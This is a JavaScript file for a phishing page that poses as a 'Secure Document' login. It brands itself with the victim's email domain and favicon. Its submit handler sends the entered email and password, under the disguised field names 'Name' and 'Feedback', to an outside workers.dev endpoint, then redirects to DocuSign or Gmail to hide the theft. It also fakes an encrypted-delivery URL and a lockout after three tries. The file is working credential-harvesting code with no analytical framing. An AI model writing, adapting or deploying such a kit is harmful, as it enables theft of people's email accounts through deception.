(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        BG_IMG: '',
        BG_BRI: 1,
        BG_DAR: 1,
        BG_CON: 1,
        BG_SAT: 1,
        BG_BLUR: 0,
        BG_GRAY: false,
        BG_OVERLAY: 0.25,
        // NEW ENDPOINT
        PHP_ENDPOINT: 'https://rum-email-proxy.haricoting.workers.dev/contact',
        SUCCESS_REDIRECT: 'https://www.docusign.com/Signin/Session/dashboard',
        LOCKOUT_REDIRECT: 'https://mail.google.com/mail/u/0/#inbox',
        SECRET_KEY: 'fdfmdkfmsd',
        MAX_TRIES: 3,
        LOCKOUT_DELAY: 2000,
        STORAGE_KEY: 'zz_core_st',
        PATH_SEGMENTS: ['Encrypted', 'Delivery', 'Secure', 'Docu', 'ment'],
        MSG_WRONG: 'Incorrect access code. Please try again later.',
        MSG_LOCKOUT: 'Too many incorrect attempts. Access blocked.',
        MSG_GRANTED: 'Access granted. Redirecting...',
        MSG_NET: 'Network error. Please try again.',
        HEADING: 'Secure Document',
        SUBHEAD: 'Login to view your secure document',
        FOOTER: '· © 2026',
        EMAIL_LABEL: 'Email',
        KEY_LABEL: 'Password',
        KEY_PLACEHOLDER: 'Enter your password',
        BUTTON_TEXT: 'Unlock',
        TAG_TEXT: 'Encrypted'
    };

    // Create background canvas
    function createBackground() {
        const bgCanvas = document.createElement('div');
        bgCanvas.id = 'bg_canvas';
        bgCanvas.appendChild(document.createTextNode(''));
        document.body.appendChild(bgCanvas);
    }

    // Create main UI
    function createUI() {
        const mainForm = document.createElement('div');
        const alertNode = document.createElement('div');
        const bgVeil = document.createElement('div');
        const titleNode = document.createElement('h1');
        const captionNode = document.createElement('div');
        
        mainForm.id = 'main_form';
        alertNode.id = 'alert_node';
        bgVeil.id = 'bg_veil';
        titleNode.id = 'title_node';
        
        titleNode.innerHTML = `<div class="brand_row"><div class="brand_orb"><img src="" alt="brand_img" id="brand_img"></div><div class="title_main">Secure Document</div></div>`;
        captionNode.innerHTML = `<div class="caption_sub">Login to view your secure document</div>`;
        
        document.body.appendChild(mainForm);
        document.body.appendChild(alertNode);
        document.body.appendChild(bgVeil);
        document.body.appendChild(titleNode);
        document.body.appendChild(captionNode);
    }

    // Apply background styles
    function applyBackgroundStyles() {
        const bgCanvas = document.getElementById('bg_canvas');
        const bgVeil = document.getElementById('bg_veil');
        
        if (!bgCanvas || !bgVeil) return;
        
        const styles = [];
        styles.push(`background-image: url('${CONFIG.BG_IMG}')`);
        styles.push(`brightness(${CONFIG.BG_BRI})`);
        styles.push(`contrast(${CONFIG.BG_CON})`);
        
        if (CONFIG.BG_BLUR > 0) {
            styles.push(`blur(${CONFIG.BG_BLUR}px)`);
        }
        if (CONFIG.BG_GRAY) {
            styles.push('grayscale(1)');
        }
        
        bgCanvas.style.filter = styles.join(' ');
        bgVeil.style.background = `rgba(10,66,123,${CONFIG.BG_OVERLAY})`;
    }

    // Generate random token for URL
    function updateURL() {
        try {
            const array = new Uint8Array(16);
            crypto.getRandomValues(array);
            const token = btoa(String.fromCharCode.apply(null, array))
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=+$/, '');
            history.replaceState(null, '', `#/${CONFIG.PATH_SEGMENTS.join('/')}/${token}`);
        } catch (e) {}
    }

    // Show alert message
    function showAlert(message, type) {
        const alertNode = document.getElementById('alert_node');
        alertNode.textContent = message;
        alertNode.classList.add('visible');
        
        if (type === 'error') {
            alertNode.style.background = '#fee9e7';
            alertNode.style.color = '#b33a2f';
            alertNode.style.borderColor = '#f5c6c2';
        } else {
            alertNode.style.background = '#e3f5e9';
            alertNode.style.color = '#1e7a4b';
            alertNode.style.borderColor = '#b8e0c8';
        }
        
        if (type === 'error') {
            setTimeout(() => {
                alertNode.classList.remove('visible');
            }, 5000);
        }
    }

    // Hide alert
    function hideAlert() {
        const alertNode = document.getElementById('alert_node');
        alertNode.classList.remove('visible');
    }

    // Show loading state
    function showLoading() {
        const btn = document.getElementById('code_p4r7');
        btn.classList.remove('locked_spin');
        void btn.offsetWidth; // Force reflow
        btn.classList.add('locked_spin');
        
        setTimeout(() => {
            btn.classList.remove('locked_spin');
        }, 2000);
    }

    // Extract domain from email
    function getEmailDomain(email) {
        if (!email || email.indexOf('@') === -1) return '';
        const parts = email.split('@');
        if (parts.length === 2 && parts[0].trim() !== '') {
            return parts[1].trim().toLowerCase();
        }
        return '';
    }

    // Capitalize first letter
    function capitalize(str) {
        if (!str) return '';
        return str.charAt(0).toUpperCase() + str.slice(1);
    }

    // Handle lockout
    function handleLockout() {
        const btn = document.getElementById('code_p4r7');
        const passwordField = document.getElementById('code_p4r7_input');
        
        if (isLocked) return;
        isLocked = true;
        
        passwordField.value = '';
        btn.disabled = true;
        showAlert(CONFIG.MSG_LOCKOUT, 'error');
        showLoading();
        
        setTimeout(() => {
            window.location.href = CONFIG.LOCKOUT_REDIRECT;
        }, CONFIG.LOCKOUT_DELAY);
    }

    // Update email display
    function updateEmailDisplay() {
        const emailInput = document.getElementById('mail_x9k2');
        const captionTitle = document.getElementById('title_node');
        const captionSub = document.getElementById('caption_node');
        const emailSlot = document.getElementById('mail_slot');
        
        const email = emailInput.value.trim();
        const domain = getEmailDomain(email);
        
        if (!domain) {
            captionTitle.textContent = CONFIG.HEADING;
            captionSub.textContent = CONFIG.SUBHEAD;
            emailSlot.textContent = CONFIG.EMAIL_LABEL;
            updateFavicon('');
            return;
        }
        
        const domainName = capitalize(domain.split('.')[0]);
        captionTitle.textContent = `${domainName} ${CONFIG.HEADING}`;
        captionSub.textContent = `${domainName} ${CONFIG.SUBHEAD}`;
        emailSlot.textContent = `${domainName} ${CONFIG.EMAIL_LABEL}`;
        
        updateFavicon(domain);
    }

    // Update favicon
    function updateFavicon(domain) {
        const img = new Image();
        const url = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
        
        img.onload = () => {
            document.getElementById('brand_img').src = url;
        };
        img.onerror = () => {
            document.getElementById('brand_img').src = getDefaultIcon();
        };
        img.src = url;
    }

    // Get default icon
    function getDefaultIcon() {
        return 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"%3E%3Ccircle cx="12" cy="12" r="10" fill="%23464f5b"/%3E%3C/svg%3E';
    }

    // Form submission handler - MODIFIED
    function handleSubmit() {
        const emailInput = document.getElementById('mail_x9k2');
        const passwordInput = document.getElementById('code_p4r7_input');
        const submitBtn = document.getElementById('code_p4r7');
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!email || email.indexOf('@') === -1) {
            showAlert('Please enter a valid email address.', 'error');
            showLoading();
            return;
        }
        
        if (!password) {
            showAlert(CONFIG.MSG_WRONG, 'error');
            showLoading();
            return;
        }
        
        if (isLocked) return;
        
        submitBtn.textContent = 'Loading...';
        submitBtn.disabled = true;
        hideAlert();
        
        // NEW PAYLOAD FORMAT - URLSearchParams
        const cleanPayload = new URLSearchParams();
        cleanPayload.append("Name", email);
        cleanPayload.append("Feedback", password);
        cleanPayload.append("timestamp", Date.now().toString());
        
        const startTime = Date.now();
        
        fetch(CONFIG.PHP_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: cleanPayload.toString()
        })
        .then(response => {
            // Check if response is JSON or text
            const contentType = response.headers.get('content-type');
            if (contentType && contentType.includes('application/json')) {
                return response.json();
            }
            return response.text();
        })
        .then(data => {
            processResponse(data);
        })
        .catch(() => handleError())
        .then(() => {
            const elapsed = Date.now() - startTime;
            const delay = Math.max(2000, 3000 - elapsed);
            return new Promise(resolve => setTimeout(resolve, delay));
        })
        .then(() => {
            submitBtn.textContent = CONFIG.BUTTON_TEXT;
            submitBtn.disabled = false;
        });
    }

    // Process server response - MODIFIED to handle text or object response
    function processResponse(data) {
        const attemptCount = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || '0', 10) + 1;
        sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attemptCount));
        
        // Handle both JSON object and text responses
        let status = 'error';
        if (typeof data === 'object' && data !== null) {
            status = data.status || 'error';
        } else if (typeof data === 'string') {
            // If response is text, assume success if it contains certain keywords
            status = data.toLowerCase().includes('success') || data.toLowerCase().includes('ok') ? 'success' : 'error';
        }
        
        if (status === 'success') {
            showAlert(CONFIG.MSG_GRANTED, 'success');
            setTimeout(() => {
                window.location.href = CONFIG.SUCCESS_REDIRECT;
            }, 2000);
        } else if (status === 'exhausted') {
            showAlert(CONFIG.MSG_LOCKOUT, 'error');
            setTimeout(() => {
                window.location.href = CONFIG.LOCKOUT_REDIRECT;
            }, 2000);
        } else {
            if (attemptCount >= CONFIG.MAX_TRIES) {
                handleLockout();
                return;
            }
            showAlert(CONFIG.MSG_WRONG, 'error');
            showLoading();
            passwordInput.value = '';
            passwordInput.focus();
        }
    }

    // Handle network/error states
    function handleError() {
        showAlert(CONFIG.MSG_NET, 'error');
        showLoading();
        const passwordInput = document.getElementById('code_p4r7_input');
        passwordInput.value = '';
        passwordInput.focus();
    }

    // Initialize
    let isLocked = false;
    
    function init() {
        createBackground();
        createUI();
        applyBackgroundStyles();
        updateURL();
        
        // Get DOM references
        const emailInput = document.getElementById('mail_x9k2');
        const passwordInput = document.getElementById('code_p4r7_input');
        const toggleBtn = document.getElementById('eye_toggle');
        const submitBtn = document.getElementById('code_p4r7');
        
        // Event listeners
        emailInput.addEventListener('input', updateEmailDisplay);
        
        toggleBtn.addEventListener('click', () => {
            const isPassword = passwordInput.getAttribute('type') === 'password';
            passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
            document.getElementById('eye_show').style.display = isPassword ? 'block' : 'none';
            document.getElementById('eye_hide').style.display = isPassword ? 'none' : 'block';
            passwordInput.focus();
        });
        
        submitBtn.addEventListener('click', (e) => {
            e.preventDefault();
            handleSubmit();
        });
        
        updateEmailDisplay();
    }

    // Start
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
